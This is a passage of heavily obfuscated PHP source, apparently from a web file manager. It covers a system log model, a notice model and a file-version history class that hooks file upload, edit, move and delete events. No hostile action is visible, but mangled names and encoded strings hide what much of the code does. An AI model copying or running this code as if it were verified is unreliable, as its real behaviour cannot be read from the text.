$§™­Æ³[$ÕØó•¢Ô[475]]) { return !1; } return parent::update($§™­Æ³[$ÕØó•¢Ô[475]], $Äå®¥ıÙ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\145\x54\151\x6d\x65", "\x74\151\x6d\x65", "\151\156\163\x65\x72\164", "\x66\x75\156\143\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $éÒòÑ‹‚ =& $_SERVER[¿ğÚ‰±–]; return array($éÒòÑ‹‚[2336] => LNG($éÒòÑ‹‚[2337]), $éÒòÑ‹‚[2338] => LNG($éÒòÑ‹‚[2339]), $éÒòÑ‹‚[1918] => LNG($éÒòÑ‹‚[2340]), $éÒòÑ‹‚[2341] => LNG($éÒòÑ‹‚[2342]), $éÒòÑ‹‚[2343] => LNG($éÒòÑ‹‚[2344]), $éÒòÑ‹‚[2345] => LNG($éÒòÑ‹‚[2346]), $éÒòÑ‹‚[2347] => LNG($éÒòÑ‹‚[2348]), $éÒòÑ‹‚[1948] => LNG($éÒòÑ‹‚[2348]), $éÒòÑ‹‚[1949] => LNG($éÒòÑ‹‚[2349]), $éÒòÑ‹‚[2350] => LNG($éÒòÑ‹‚[2351]), $éÒòÑ‹‚[2352] => LNG($éÒòÑ‹‚[2353]), $éÒòÑ‹‚[2354] => LNG($éÒòÑ‹‚[2355]), $éÒòÑ‹‚[2356] => LNG($éÒòÑ‹‚[2357]), $éÒòÑ‹‚[1946] => LNG($éÒòÑ‹‚[2358]), $éÒòÑ‹‚[2359] => LNG($éÒòÑ‹‚[2360]), $éÒòÑ‹‚[1953] => LNG($éÒòÑ‹‚[2361]), $éÒòÑ‹‚[2362] => LNG($éÒòÑ‹‚[2363]), $éÒòÑ‹‚[2364] => LNG($éÒòÑ‹‚[2365]), $éÒòÑ‹‚[2366] => LNG($éÒòÑ‹‚[2367]), $éÒòÑ‹‚[2368] => LNG($éÒòÑ‹‚[2369]), $éÒòÑ‹‚[1956] => LNG($éÒòÑ‹‚[2370]), $éÒòÑ‹‚[1957] => LNG($éÒòÑ‹‚[2371]), $éÒòÑ‹‚[2372] => LNG($éÒòÑ‹‚[2373]), $éÒòÑ‹‚[2374] => LNG($éÒòÑ‹‚[2375]), $éÒòÑ‹‚[2376] => LNG($éÒòÑ‹‚[2377]), $éÒòÑ‹‚[1951] => LNG($éÒòÑ‹‚[2378]), $éÒòÑ‹‚[2379] => LNG($éÒòÑ‹‚[2380]), $éÒòÑ‹‚[1950] => LNG($éÒòÑ‹‚[2381]), $éÒòÑ‹‚[2382] => LNG($éÒòÑ‹‚[2383]), $éÒòÑ‹‚[2384] => LNG($éÒòÑ‹‚[2385]), $éÒòÑ‹‚[2386] => LNG($éÒòÑ‹‚[2385]), $éÒòÑ‹‚[2387] => LNG($éÒòÑ‹‚[2388]), $éÒòÑ‹‚[2389] => LNG($éÒòÑ‹‚[2389]), $éÒòÑ‹‚[2390] => LNG($éÒòÑ‹‚[1922]), $éÒòÑ‹‚[2391] => LNG($éÒòÑ‹‚[2392]), $éÒòÑ‹‚[2393] => LNG($éÒòÑ‹‚[2394]), $éÒòÑ‹‚[2395] => LNG($éÒòÑ‹‚[2396]), $éÒòÑ‹‚[2397] => LNG($éÒòÑ‹‚[2398]), $éÒòÑ‹‚[2399] => LNG($éÒòÑ‹‚[2400]), $éÒòÑ‹‚[2401] => LNG($éÒòÑ‹‚[2401]), $éÒòÑ‹‚[2402] => LNG($éÒòÑ‹‚[2403]), $éÒòÑ‹‚[2404] => LNG($éÒòÑ‹‚[2405]), $éÒòÑ‹‚[2406] => LNG($éÒòÑ‹‚[2407]), $éÒòÑ‹‚[2408] => LNG($éÒòÑ‹‚[2409]), $éÒòÑ‹‚[2410] => LNG($éÒòÑ‹‚[2411]), $éÒòÑ‹‚[2412] => LNG($éÒòÑ‹‚[2413]), $éÒòÑ‹‚[212] => LNG($éÒòÑ‹‚[212]), $éÒòÑ‹‚[213] => LNG($éÒòÑ‹‚[2414]), $éÒòÑ‹‚[2415] => LNG($éÒòÑ‹‚[2415])); } private function typeFile() { $ÆœãÒ‰ =& $_SERVER[¿ğÚ‰±–]; $Ÿ”ööç = array($ÆœãÒ‰[1953] => array($ÆœãÒ‰[1954]), $ÆœãÒ‰[2354] => array($ÆœãÒ‰[2416]), $ÆœãÒ‰[2356] => array($ÆœãÒ‰[2417]), $ÆœãÒ‰[1946] => array($ÆœãÒ‰[1947], $ÆœãÒ‰[2418]), $ÆœãÒ‰[2364] => array(), $ÆœãÒ‰[2366] => array(), $ÆœãÒ‰[2368] => array(), $ÆœãÒ‰[1956] => array($ÆœãÒ‰[1958]), $ÆœãÒ‰[1957] => array($ÆœãÒ‰[1958]), $ÆœãÒ‰[2372] => array($ÆœãÒ‰[2419]), $ÆœãÒ‰[2374] => array($ÆœãÒ‰[2419]), $ÆœãÒ‰[2376] => array($ÆœãÒ‰[2420]), $ÆœãÒ‰[2362] => array($ÆœãÒ‰[2421]), $ÆœãÒ‰[1951] => array($ÆœãÒ‰[2422]), $ÆœãÒ‰[2379] => array($ÆœãÒ‰[2423]), $ÆœãÒ‰[1950] => array($ÆœãÒ‰[1952])); return $Ÿ”ööç; } private function typeAll() { $ÍÜûĞ¶µ =& $_SERVER[¿ğÚ‰±–]; $”øßÖšÚ = $this->typeList; $ŒÓí³ÔÔ = array_filter($this->typeFile()); foreach ($ŒÓí³ÔÔ as $Ø„¨¢ë¾ => $û¸í¤ô) { $”øßÖšÚ[$û¸í¤ô[0]] = $”øßÖšÚ[$Ø„¨¢ë¾]; } $”øßÖšÚ[$ÍÜûĞ¶µ[1958]] = LNG($ÍÜûĞ¶µ[2424]); $”øßÖšÚ[$ÍÜûĞ¶µ[2419]] = LNG($ÍÜûĞ¶µ[2425]); return $”øßÖšÚ; } public function addLog($¹û¹œ, $³åÜ¶«Ù = array()) { $‡¤¾ÛÒ =& $_SERVER[¿ğÚ‰±–]; if (!isset($this->typeList[$¹û¹œ])) { return; } $Ğ®çÈïá = Session::get($‡¤¾ÛÒ[2117]); if (!$Ğ®çÈïá) { $Ğ®çÈïá = _get($³åÜ¶«Ù, $‡¤¾ÛÒ[1777], 0); } if ($¹û¹œ == $‡¤¾ÛÒ[2391] && is_array($³åÜ¶«Ù[$‡¤¾ÛÒ[2426]]) && !$³åÜ¶«Ù[$‡¤¾ÛÒ[2426]]) { return; } $ú²¹ÚéÍ = get_client_ip(); if (!$³åÜ¶«Ù || strlen(json_encode($³åÜ¶«Ù)) >= 1024 * 64) { if ($³åÜ¶«Ù && is_array($³åÜ¶«Ù)) { $³åÜ¶«Ù = array_intersect_key($³åÜ¶«Ù, array_flip($‡¤¾ÛÒ[475], $‡¤¾ÛÒ[32])); $³åÜ¶«Ù[$‡¤¾ÛÒ[2427]] = $ú²¹ÚéÍ; } else { $³åÜ¶«Ù = array($‡¤¾ÛÒ[2427] => $ú²¹ÚéÍ); } } else { if (is_array($³åÜ¶«Ù)) { $³åÜ¶«Ù[$‡¤¾ÛÒ[2427]] = $ú²¹ÚéÍ; } else { $³åÜ¶«Ù = array($‡¤¾ÛÒ[1294] => $³åÜ¶«Ù, $‡¤¾ÛÒ[2427] => $ú²¹ÚéÍ); } } $³åÜ¶«Ù = array($‡¤¾ÛÒ[1767] => Session::sign(), $‡¤¾ÛÒ[1768] => intval($Ğ®çÈïá), $‡¤¾ÛÒ[33] => $¹û¹œ, $‡¤¾ÛÒ[1770] => json_encode($³åÜ¶«Ù)); parent::add($³åÜ¶«Ù); } public function remove($åÕ”Æ´Í) { $this->where(array($_SERVER[¿ğÚ‰±–][493] => $åÕ”Æ´Í))->delete(); } private function _makeOrder($·ÈÍ±«Ï = '') { $¨“ô¶Ùµ =& $_SERVER[¿ğÚ‰±–]; $Ø‚¶ÄÁ¶ = $¨“ô¶Ùµ[231]; $¢ß¢ô÷­ = array($¨“ô¶Ùµ[523] => $¨“ô¶Ùµ[524], $¨“ô¶Ùµ[525] => $¨“ô¶Ùµ[526]); $êë‘ºÎ± = Input::get($¨“ô¶Ùµ[531], $¨“ô¶Ùµ[7], $¨“ô¶Ùµ[2153], array($¨“ô¶Ùµ[2071], $¨“ô¶Ùµ[525])); $êë‘ºÎ± = $¢ß¢ô÷­[$êë‘ºÎ±]; $·ÈÍ±«Ï = $·ÈÍ±«Ï . "{$Ø‚¶ÄÁ¶}\x20{$êë‘ºÎ±}"; return $this->order($·ÈÍ±«Ï); } public function get($¸öÌÁÊô = '') { $©¬ñË¸º =& $_SERVER[¿ğÚ‰±–]; if (!$¸öÌÁÊô) { show_json(array()); } $§…é…†İ = array(); if ($¸öÌÁÊô[$©¬ñË¸º[1777]]) { $§…é…†İ[$©¬ñË¸º[1777]] = $¸öÌÁÊô[$©¬ñË¸º[1777]]; } if (isset($¸öÌÁÊô[$©¬ñË¸º[838]])) { $Ş—¼ï†Æ = $¸öÌÁÊô[$©¬ñË¸º[838]]; $¼™ä†Ğ = isset($¸öÌÁÊô[$©¬ñË¸º[839]]) ? $¸öÌÁÊô[$©¬ñË¸º[839]] : time(); $§…é…†İ[$©¬ñË¸º[231]] = array($©¬ñË¸º[409], array($Ş—¼ï†Æ, $¼™ä†Ğ)); } if ($¸öÌÁÊô[$©¬ñË¸º[33]]) { $Ø¡³ƒ¦• = explode($©¬ñË¸º[50], $¸öÌÁÊô[$©¬ñË¸º[33]]); $Ä àŒ¸Ó = $this->typeFile(); $î«ÁÒÉô = array(); foreach ($Ø¡³ƒ¦• as $‰®–¯Ä£) { $î«ÁÒÉô[] = $‰®–¯Ä£; if (isset($Ä àŒ¸Ó[$‰®–¯Ä£])) { $î«ÁÒÉô = array_merge($î«ÁÒÉô, $Ä àŒ¸Ó[$‰®–¯Ä£]); } } $î«ÁÒÉô = array_unique($î«ÁÒÉô); if ($î«ÁÒÉô) { $§…é…†İ[$©¬ñË¸º[33]] = array($©¬ñË¸º[7], $î«ÁÒÉô); } } else { $§…é…†İ[$©¬ñË¸º[33]] = array($©¬ñË¸º[2428], $©¬ñË¸º[2429]); } if (!empty($¸öÌÁÊô[$©¬ñË¸º[2427]])) { $§…é…†İ[$©¬ñË¸º[526]] = array($©¬ñË¸º[459], "\x25{$¸öÌÁÊô[$©¬ñË¸º[2427]]}\45"); } $Ô’÷¹Ñ‚ = $this->_makeOrder()->where($§…é…†İ)->selectPage(); if (empty($Ô’÷¹Ñ‚[$©¬ñË¸º[445]])) { show_json(array(), !0, $Ô’÷¹Ñ‚[$©¬ñË¸º[442]]); } $Ô’÷¹Ñ‚[$©¬ñË¸º[445]] = $this->logList($Ô’÷¹Ñ‚[$©¬ñË¸º[445]]); return $Ô’÷¹Ñ‚; } private function ipAddress(&$ã’íÅìÔ) { $Œû­±â =& $_SERVER[¿ğÚ‰±–]; if (!empty($ã’íÅìÔ[$Œû­±â[2427]])) { $ƒ§‹ß – = IpLocation::get($ã’íÅìÔ[$Œû­±â[2427]]); } else { $ƒ§‹ß – = LNG($Œû­±â[2430]); } $ã’íÅìÔ[$Œû­±â[2431]] = $ƒ§‹ß –; } private function descZipDownload($²™†ï‚Ü, &$´í“ÇŠ§) { $›úîˆ² =& $_SERVER[¿ğÚ‰±–]; if (!isset($²™†ï‚Ü[$›úîˆ²[2432]])) { return; } $ù¢íŒáÂ = json_decode($²™†ï‚Ü[$›úîˆ²[2432]], !0); foreach ($ù¢íŒáÂ as $‰ ½œ¢) { try { $€“ÁÂË² = IO::infoFullSimple($‰ ½œ¢[$›úîˆ²[87]]); } catch (Exception $Úæ§Ì³Œ) { continue; } $²™†ï‚Ü[$›úîˆ²[87]] = $‰ ½œ¢[$›úîˆ²[87]]; $´í“ÇŠ§[] = $²™†ï‚Ü[$›úîˆ²[193]] = $€“ÁÂË²[$›úîˆ²[193]]; $´í“ÇŠ§[] = $²™†ï‚Ü[$›úîˆ²[2209]] = $€“ÁÂË²[$›úîˆ²[192]]; break; } return $²™†ï‚Ü; } private function getSourceList(&$¼–©Ù’ ) { $ºÓÜúÀ³ =& $_SERVER[¿ğÚ‰±–]; $èÅı‘­­ = array(); foreach ($¼–©Ù’  as $¨·ù¯† => $±¾Ùöı) { $ıª¾‚Š‡ = json_decode($±¾Ùöı[$ºÓÜúÀ³[526]], !0); if ($±¾Ùöı[$ºÓÜúÀ³[33]] == $ºÓÜúÀ³[1949]) { $ıª¾‚Š‡ = $this->descZipDownload($ıª¾‚Š‡, $èÅı‘­­); $¼–©Ù’ [$¨·ù¯†][$ºÓÜúÀ³[526]] = json_encode($ıª¾‚Š‡); continue; } if (strpos($±¾Ùöı[$ºÓÜúÀ³[33]], $ºÓÜúÀ³[2211]) !== 0) { if (!isset($ıª¾‚Š‡[$ºÓÜúÀ³[87]]) || strpos($±¾Ùöı[$ºÓÜúÀ³[33]], $ºÓÜúÀ³[2433]) !== 0) { continue; } try { $¦õŸóçÓ = IO::infoFullSimple($ıª¾‚Š‡[$ºÓÜúÀ³[87]]); } catch (Exception $ûºëş…²) { continue; } $èÅı‘­­[] = $ıª¾‚Š‡[$ºÓÜúÀ³[193]] = $¦õŸóçÓ[$ºÓÜúÀ³[193]]; $èÅı‘­­[] = $ıª¾‚Š‡[$ºÓÜúÀ³[2209]] = $¦õŸóçÓ[$ºÓÜúÀ³[192]]; $¼–©Ù’ [$¨·ù¯†][$ºÓÜúÀ³[526]] = json_encode($ıª¾‚Š‡); continue; } $èÅı‘­­[] = $ıª¾‚Š‡[$ºÓÜúÀ³[193]]; $èÅı‘­­[] = $ıª¾‚Š‡[$ºÓÜúÀ³[2209]]; if ($ıª¾‚Š‡[$ºÓÜúÀ³[33]] == $ºÓÜúÀ³[620]) { $èÅı‘­­[] = $ıª¾‚Š‡[$ºÓÜúÀ³[526]][$ºÓÜúÀ³[1248]]; $èÅı‘­­[] = $ıª¾‚Š‡[$ºÓÜúÀ³[526]][$ºÓÜúÀ³[1249]]; } if ($ıª¾‚Š‡[$ºÓÜúÀ³[33]] == $ºÓÜúÀ³[2220]) { $èÅı‘­­[] = $ıª¾‚Š‡[$ºÓÜúÀ³[526]][$ºÓÜúÀ³[193]]; } } if (!$èÅı‘­­) { return array(); } return Model($ºÓÜúÀ³[902])->sourceListInfo($èÅı‘­­, !0); } private function logList($î¶ÌöÆÚ) { $ò¬âø¸ü =& $_SERVER[¿ğÚ‰±–]; $°ŞÙ¼ş = array_to_keyvalue($î¶ÌöÆÚ, $ò¬âø¸ü[12], $ò¬âø¸ü[1777]); $âÉ©öƒÉ = Model($ò¬âø¸ü[598])->userListInfo(array_unique($°ŞÙ¼ş)); $ªÑìëô× = $this->getSourceList($î¶ÌöÆÚ); $şıÀ­ó = $this->typeAll(); $Ãõ¾œäà = array(); $Ôñ»èÀ¢ = array(); foreach ($î¶ÌöÆÚ as $ıš¾¡Åî => $ã´Üæ‡ı) { $ßÎúë× = $ã´Üæ‡ı[$ò¬âø¸ü[33]]; $ö×ùÏï = isset($âÉ©öƒÉ[$ã´Üæ‡ı[$ò¬âø¸ü[1777]]]) ? $âÉ©öƒÉ[$ã´Üæ‡ı[$ò¬âø¸ü[1777]]] : !1; $ö¦ÏşÉô = strpos($ßÎúë×, $ò¬âø¸ü[2434]) === 0 ? LNG($ò¬âø¸ü[2435]) : LNG($ò¬âø¸ü[2430]); $ã´Üæ‡ı[$ò¬âø¸ü[32]] = isset($ö×ùÏï[$ò¬âø¸ü[32]]) ? $ö×ùÏï[$ò¬âø¸ü[32]] : LNG($ò¬âø¸ü[2430]); $ã´Üæ‡ı[$ò¬âø¸ü[2264]] = isset($ö×ùÏï[$ò¬âø¸ü[2264]]) ? $ö×ùÏï[$ò¬âø¸ü[2264]] : $ò¬âø¸ü[12]; $ã´Üæ‡ı[$ò¬âø¸ü[1666]] = isset($şıÀ­ó[$ßÎúë×]) ? $şıÀ­ó[$ßÎúë×] : $ö¦ÏşÉô; $ã´Üæ‡ı[$ò¬âø¸ü[2152]] = $ö×ùÏï; $­­³¬øÚ = json_decode($ã´Üæ‡ı[$ò¬âø¸ü[526]], !0); $ã´Üæ‡ı[$ò¬âø¸ü[2427]] = isset($­­³¬øÚ[$ò¬âø¸ü[2427]]) ? $­­³¬øÚ[$ò¬âø¸ü[2427]] : $ò¬âø¸ü[12]; $ã´Üæ‡ı[$ò¬âø¸ü[2431]] = IpLocation::get($ã´Üæ‡ı[$ò¬âø¸ü[2427]]); if (strpos($ßÎúë×, $ò¬âø¸ü[2211]) === 0 || isset($­­³¬øÚ[$ò¬âø¸ü[2209]])) { $­­³¬øÚ[$ò¬âø¸ü[90]] = $ªÑìëô×[$­­³¬øÚ[$ò¬âø¸ü[193]]]; $­­³¬øÚ[$ò¬âø¸ü[2225]] = $ªÑìëô×[$­­³¬øÚ[$ò¬âø¸ü[2209]]]; if ($­­³¬øÚ[$ò¬âø¸ü[33]] == $ò¬âø¸ü[620]) { $­­³¬øÚ[$ò¬âø¸ü[526]][$ò¬âø¸ü[1248]] = $ªÑìëô×[$­­³¬øÚ[$ò¬âø¸ü[526]][$ò¬âø¸ü[1248]]]; $­­³¬øÚ[$ò¬âø¸ü[526]][$ò¬âø¸ü[1249]] = $ªÑìëô×[$­­³¬øÚ[$ò¬âø¸ü[526]][$ò¬âø¸ü[1249]]]; } if ($­­³¬øÚ[$ò¬âø¸ü[33]] == $ò¬âø¸ü[2220]) { $­­³¬øÚ[$ò¬âø¸ü[526]][$ò¬âø¸ü[193]] = $ªÑìëô×[$­­³¬øÚ[$ò¬âø¸ü[526]][$ò¬âø¸ü[193]]]; } if ($­­³¬øÚ[$ò¬âø¸ü[33]] == $ò¬âø¸ü[1944]) { $­­³¬øÚ[$ò¬âø¸ü[2225]] = $­­³¬øÚ[$ò¬âø¸ü[90]]; $­­³¬øÚ[$ò¬âø¸ü[2209]] = $­­³¬øÚ[$ò¬âø¸ü[2225]][$ò¬âø¸ü[193]]; $­­³¬øÚ[$ò¬âø¸ü[90]] = !1; $­­³¬øÚ[$ò¬âø¸ü[193]] = $ò¬âø¸ü[12]; } $²Èşó” = array($ò¬âø¸ü[1944], $ò¬âø¸ü[2207]); if (!in_array($­­³¬øÚ[$ò¬âø¸ü[33]], $²Èşó”)) { if ($­­³¬øÚ[$ò¬âø¸ü[90]] && $­­³¬øÚ[$ò¬âø¸ü[90]][$ò¬âø¸ü[190]] == $ò¬âø¸ü[191]) { $Ôñ»èÀ¢[] = $ã´Üæ‡ı[$ò¬âø¸ü[475]]; unset($î¶ÌöÆÚ[$ıš¾¡Åî]); continue; } if ($­­³¬øÚ[$ò¬âø¸ü[2225]] && $­­³¬øÚ[$ò¬âø¸ü[2225]][$ò¬âø¸ü[190]] == $ò¬âø¸ü[191]) { $Ôñ»èÀ¢[] = $ã´Üæ‡ı[$ò¬âø¸ü[475]]; unset($î¶ÌöÆÚ[$ıš¾¡Åî]); continue; } } } $ã´Üæ‡ı[$ò¬âø¸ü[526]] = $­­³¬øÚ; unset($ã´Üæ‡ı[$ò¬âø¸ü[2436]]); $Ãõ¾œäà[] = $ã´Üæ‡ı; } $this->clearSystemPathLog($Ôñ»èÀ¢); return $Ãõ¾œäà; } private function clearSystemPathLog($úµ–ø­) { $Ï‹ÓÁ» =& $_SERVER[¿ğÚ‰±–]; if (count($úµ–ø­) == 0) { return; } $”éÔüµ = array($Ï‹ÓÁ»[475] => array($Ï‹ÓÁ»[7], array_unique($úµ–ø­))); $this->where($”éÔüµ)->delete(); } public function deviceList($‘‹•ï–¨, $¼ì­Ğ½  = 0) { $ÄÆª«úî =& $_SERVER[¿ğÚ‰±–]; $‰Çä®­¤ = array($ÄÆª«úî[1777] => $‘‹•ï–¨, $ÄÆª«úî[231] => array($ÄÆª«úî[1099], $¼ì­Ğ½ ), $ÄÆª«úî[33] => $ÄÆª«úî[1918]); $•÷û‡õÁ = array(); $ı„çµ©ñ = $this->field($ÄÆª«úî[2437])->where($‰Çä®­¤)->order($ÄÆª«úî[2223])->limit(50)->select(); foreach ($ı„çµ©ñ as $ÚÀ¤Àé => $ô®Ï¥İµ) { if ($ÚÀ¤Àé > 0 && abs($ô®Ï¥İµ[$ÄÆª«úî[231]] - $ı„çµ©ñ[$ÚÀ¤Àé - 1][$ÄÆª«úî[231]]) < 5) { continue; } $è‡ŠŸ÷Ø = json_decode($ô®Ï¥İµ[$ÄÆª«úî[526]], !0); $ô®Ï¥İµ[$ÄÆª«úî[2427]] = isset($è‡ŠŸ÷Ø[$ÄÆª«úî[2427]]) ? $è‡ŠŸ÷Ø[$ÄÆª«úî[2427]] : $ÄÆª«úî[12]; unset($è‡ŠŸ÷Ø[$ÄÆª«úî[2427]]); $ˆ¼„˜—” = $this->deviceType($è‡ŠŸ÷Ø[$ÄÆª«úî[2212]]); if (isset($•÷û‡õÁ[$ˆ¼„˜—”])) { continue; } $ô®Ï¥İµ[$ÄÆª«úî[2431]] = IpLocation::get($ô®Ï¥İµ[$ÄÆª«úî[2427]]); $ô®Ï¥İµ[$ÄÆª«úî[526]] = $è‡ŠŸ÷Ø; $•÷û‡õÁ[$ˆ¼„˜—”] = $ô®Ï¥İµ; } return array_values($•÷û‡õÁ); } public function deviceType($Ğœ¸õÃ‰) { return $Ğœ¸õÃ‰; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\156\x6f\x74\151\143\145\x4c\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\143\157\156\x74\145\x6e\164", "\141\x75\x74\150", "\x6d\157\144\x65", "\164\x69\155\145", "\x74\x79\160\x65", "\x6c\145\166\145\154", "\x65\x6e\141\142\x6c\x65", "\163\x6f\162\164"); public function listData($—ªÕÌ»Ù = false, $‹óŞƒÙ = "\x73\x6f\x72\x74", $Š³–” = false) { return parent::listData($—ªÕÌ»Ù, $‹óŞƒÙ, $Š³–”); } public function add($î·ïôü®) { $’Îñ‰Å =& $_SERVER[¿ğÚ‰±–]; $²°ó¥ªû = time(); if ($î·ïôü®[$’Îñ‰Å[16]] == $’Îñ‰Å[2438]) { $²°ó¥ªû = strtotime($î·ïôü®[$’Îñ‰Å[206]]); } $î·ïôü®[$’Îñ‰Å[206]] = $²°ó¥ªû; return parent::insert($î·ïôü®); } public function update($â”éŞ›©, $¯şî§‡ª) { $§Ó›’·‡ =& $_SERVER[¿ğÚ‰±–]; $–¬ÅµÎª = $this->listData($â”éŞ›©); if (!$–¬ÅµÎª) { return !1; } $ıæ¤³‡¼ = time(); if ($¯şî§‡ª[$§Ó›’·‡[16]] == $§Ó›’·‡[2438]) { $ıæ¤³‡¼ = strtotime($¯şî§‡ª[$§Ó›’·‡[206]]); } $¯şî§‡ª[$§Ó›’·‡[206]] = $ıæ¤³‡¼; return parent::update($â”éŞ›©, $¯şî§‡ª); } public function remove($â¢ôÃ¹à) { $éÅ”Íò° = $this->listData($â¢ôÃ¹à); if (!$éÅ”Íò° || $éÅ”Íò°[$_SERVER[¿ğÚ‰±–][191]]) { return !1; } return parent::remove($â¢ôÃ¹à); } public function sort($ÄüÑá¢Ö, $òúÏæ¢Ë) { return parent::update($ÄüÑá¢Ö, $òúÏæ¢Ë); } public function enable($öüøüâ, $ïĞ€…›ò) { return parent::update($öüøüâ, array($_SERVER[¿ğÚ‰±–][2439] => $ïĞ€…›ò)); } private function initUserOption() { $¶ÁıÄìù =& $_SERVER[¿ğÚ‰±–]; $this->optionType = $¶ÁıÄìù[2440]; $this->modelType = $¶ÁıÄìù[2441]; $this->field = array($¶ÁıÄìù[2442], $¶ÁıÄìù[32], $¶ÁıÄìù[206], $¶ÁıÄìù[33], $¶ÁıÄìù[2443], $¶ÁıÄìù[828], $¶ÁıÄìù[226]); } public function userNoticeGet($©•¡°şê = false) { $this->initUserOption(); return parent::listData($©•¡°şê, $_SERVER[¿ğÚ‰±–][475], !0); } public function userNoticeAdd($øëÀ…û) { $÷ŒÂ‘‹ş =& $_SERVER[¿ğÚ‰±–]; $this->initUserOption(); $é‘îÊÎ‰ = $this->findByKey($÷ŒÂ‘‹ş[2442], $øëÀ…û[$÷ŒÂ‘‹ş[475]]); if ($é‘îÊÎ‰) { return !0; } $ÑÚ¶µãª = array($÷ŒÂ‘‹ş[2442] => $øëÀ…û[$÷ŒÂ‘‹ş[475]], $÷ŒÂ‘‹ş[32] => $øëÀ…û[$÷ŒÂ‘‹ş[32]], $÷ŒÂ‘‹ş[206] => $øëÀ…û[$÷ŒÂ‘‹ş[206]], $÷ŒÂ‘‹ş[33] => isset($øëÀ…û[$÷ŒÂ‘‹ş[33]]) ? $øëÀ…û[$÷ŒÂ‘‹ş[33]] : 1, $÷ŒÂ‘‹ş[2443] => isset($øëÀ…û[$÷ŒÂ‘‹ş[2443]]) ? $øëÀ…û[$÷ŒÂ‘‹ş[2443]] : 0, $÷ŒÂ‘‹ş[828] => 0, $÷ŒÂ‘‹ş[226] => 0); return parent::insert($ÑÚ¶µãª); } public function userNoticeEdit($èí§©×Ò, $ÂÑ¤) { $this->initUserOption(); return parent::update($èí§©×Ò, $ÂÑ¤); } } goto eùó±­‹ÇÂ; Eõìã‘ìÆ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $µ¦÷«¥… =& $_SERVER[¿ğÚ‰±–]; $¸õû²£ = $GLOBALS[$µ¦÷«¥…[6]][$µ¦÷«¥…[92]]; if ($¸õû²£[$µ¦÷«¥…[1308]] != 1) { return; } if ($¸õû²£[$µ¦÷«¥…[1309]] <= 0) { return; } if (isset($_REQUEST[$µ¦÷«¥…[1310]]) && $_REQUEST[$µ¦÷«¥…[1310]] == $µ¦÷«¥…[91]) { return; } Hook::bind($µ¦÷«¥…[1311], $µ¦÷«¥…[1312]); Hook::bind($µ¦÷«¥…[1313], $µ¦÷«¥…[1314]); Hook::bind($µ¦÷«¥…[1315], $µ¦÷«¥…[1316]); Hook::bind($µ¦÷«¥…[1317], $µ¦÷«¥…[1318]); Hook::bind($µ¦÷«¥…[1319], $µ¦÷«¥…[1320]); Hook::bind($µ¦÷«¥…[1321], $µ¦÷«¥…[1322]); } public static function eventBeforeUpload($…ğöÛ¶ ) { if ($…ğöÛ¶ [3] && $…ğöÛ¶ [3] != REPEAT_REPLACE) { return; } $ÇËó¬íõ = self::parsePath($…ğöÛ¶ [0]); if (!$ÇËó¬íõ) { return; } self::add($ÇËó¬íõ); } public static function eventBeforeEdit($ãã©Ä) { $ñ›æ±ÛÌ = self::parsePath($ãã©Ä[0]); if (!$ñ›æ±ÛÌ) { return; } self::add($ñ›æ±ÛÌ); } public static function eventBeforeCopyFile($Ûò£¡¤, $ê¹ò¹ò, $ß¾œó†‘, $º”ëÕúË, $øé„…È°, $ã†ùüÌÂ) { $¸ûÛ¥Ï =& $_SERVER[¿ğÚ‰±–]; if (isset($ß¾œó†‘->_data[$¸ûÛ¥Ï[1243]]) && $ß¾œó†‘->_data[$¸ûÛ¥Ï[1243]]) { return; } $¤¸èµË = $ß¾œó†‘->getPathOuter($º”ëÕúË); $²¿¯®ã = self::parsePath($¤¸èµË); if (!$²¿¯®ã) { return; } self::add($²¿¯®ã); } public static function eventBeforeRename($¶Í„¶ï) { $Ğ”é£ª¹ =& $_SERVER[¿ğÚ‰±–]; $ÚÌ¼‘–½ = self::parsePath($¶Í„¶ï[0]); if (!$ÚÌ¼‘–½) { return; } $ËëÑÏÓ = self::checkInHistory($ÚÌ¼‘–½); if (!$ËëÑÏÓ) { return; } if ($ËëÑÏÓ[$Ğ”é£ª¹[33]] == $Ğ”é£ª¹[230]) { $„š­Íé = self::listData($ÚÌ¼‘–½); if ($„š­Íé && $„š­Íé[$Ğ”é£ª¹[445]]) { self::moveHistory($ÚÌ¼‘–½, $¶Í„¶ï[1]); } } else { IO::rename($ËëÑÏÓ[$Ğ”é£ª¹[87]], $¶Í„¶ï[1]); } } public static function eventBeforeMove($Ø‚“à ë) { $šŞİÑ·¯ =& $_SERVER[¿ğÚ‰±–]; $Ê«šÏô = self::parsePath($Ø‚“à ë[0]); if (!$Ê«šÏô) { return; } $áƒÅù‰ß = self::parsePath($Ø‚“à ë[1]); if (!$áƒÅù‰ß) { return; } $÷ÔšŒì¸ = $Ø‚“à ë[3]; $øé ìĞå = self::checkInHistory($Ê«šÏô); if (!$øé ìĞå) { return; } $®Â‹°‚£ = self::pathHistory($áƒÅù‰ß); if ($øé ìĞå[$šŞİÑ·¯[33]] == $šŞİÑ·¯[230]) { $…Ä³ôË¯ = self::listData($Ê«šÏô); $ø›¿¸É¹ = rtrim($áƒÅù‰ß, $šŞİÑ·¯[8]) . $šŞİÑ·¯[8] . ($÷ÔšŒì¸ ? $÷ÔšŒì¸ : get_path_this($Ê«šÏô)); $ú—¬Åñó = self::listData($ø›¿¸É¹); if ($…Ä³ôË¯ && $…Ä³ôË¯[$šŞİÑ·¯[445]] && $ú—¬Åñó && $ú—¬Åñó[$šŞİÑ·¯[445]]) { return self::clear($Ê«šÏô); } if ($…Ä³ôË¯ && $…Ä³ôË¯[$šŞİÑ·¯[445]]) { self::moveHistory($Ê«šÏô, $÷ÔšŒì¸, $®Â‹°‚£); } } else { IO::move($øé ìĞå[$šŞİÑ·¯[87]], $®Â‹°‚£, !1, $÷ÔšŒì¸); self::clearEmptyFolder(IO::pathFather($øé ìĞå[$šŞİÑ·¯[87]])); } } public static function eventAfterRemove($§ªòÓï™, $Ñ÷†ù††) { $ÄÔÀ¹ =& $_SERVER[¿ğÚ‰±–]; if (!$Ñ÷†ù††) { return; } $´ê©´ôÙ = self::parsePath($§ªòÓï™[0]); if (!$´ê©´ôÙ) { return; } $‘£•é´² = self::checkInHistory($´ê©´ôÙ); if (!$‘£•é´²) { return; } if 